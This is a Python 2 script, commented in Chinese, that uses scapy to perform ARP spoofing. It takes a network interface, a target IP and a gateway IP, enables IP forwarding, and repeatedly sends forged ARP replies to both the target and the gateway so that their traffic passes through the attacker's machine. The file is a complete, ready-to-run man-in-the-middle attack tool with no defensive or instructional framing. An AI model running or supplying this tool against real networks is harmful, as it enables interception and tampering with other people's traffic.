# -*- coding: UTF-8 -*-

from scapy.all import *  # 导入scapy模块
from optparse import OptionParser  # 导入命令行参数处理模块optparse
import sys
import os
import platform


def main():
    usage = "Usage: [-i interface] [-t targetip] [-g gatewayip]"
    parser = OptionParser(usage)
    # -i 所选择的网卡，eth0或wlan0，存放在interface变量中
    parser.add_option('-i', dest='interface',
                      help='specify interface(input eth0, en0, wlan0 or more)')
    # -t 要攻击的ip，存放在targetip变量中
    parser.add_option('-t', dest='targetip', help='specify ip to spoof')
    # -g 网关ip，存放在gatewayip变量中
    parser.add_option('-g', dest='gatewayip', help='specify gateway ip')
    (options, args) = parser.parse_args()
    if options.interface and options.targetip and options.gatewayip:
        interface = options.interface
        tip = options.targetip
        gip = options.gatewayip
        spoof(interface, tip, gip)  # 将参数传给spoof函数
    else:
        parser.print_help()  # 显示帮助
        sys.exit(0)


def ipforwarding(forward=1):
    opsys = platform.system().lower()
    if 'darwin' in opsys:  # MAC_OS_X
        os.system("sysctl -w net.inet.ip.forwarding=%d" % (forward))
    elif 'windows' in opsys:  # WINDOWS
        os.system("echo %d > /proc/sys/net/ipv4/ip_forward" % (forward))
    else:
        os.system("echo %d > /proc/sys/net/ipv4/ip_forward" % (forward))

def spoof(interface, tip, gip):  # 获取命令行的输入实现arp攻击
    localmac = get_if_hwaddr(interface)  # get_if_hwaddr获取本地网卡MAC地址
    tmac = getmacbyip(tip)  # 根据目标ip获取其MAC地址
    gmac = getmacbyip(gip)  # 根据网关ip获取其MAC地址
    ptarget = Ether(src=localmac, dst=tmac)/ARP(hwsrc=localmac, psrc=gip,
                                                hwdst=tmac, pdst=tip, op=2)  # 构造arp响应包，欺骗目标机器网关的MAC地址为本机MAC地址
    pgateway = Ether(src=localmac, dst=gmac)/ARP(hwsrc=localmac, psrc=tip,
                                                 hwdst=gmac, pdst=gip, op=2)  # 构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址
    print tmac, gmac, localmac
    ipforwarding(1)
    try:
        while 1:
            upcase = (lambda x: x.upper() if len(x) > 0 else x)
            print "\n\t*** Start 1 attack... ***"
            print "target: %s-%s\ngateway: %s-%s\nlocal mac:%s" % (
                tip, upcase(str(tmac)), gip, upcase(
                    str(gmac)), upcase(str(localmac)))
            sendp(ptarget, inter=2, iface=interface)
            print "[*] send arp reponse to target"
            sendp(pgateway, inter=2, iface=interface)
            # 不断发送arp响应包欺骗目标机器和网关，直到ctrl+c结束程序
            print "[*] send arp reponse to gateway"
    except KeyboardInterrupt:
        ipforwarding(0)
        sys.exit(0)


if __name__ == '__main__':
    main()
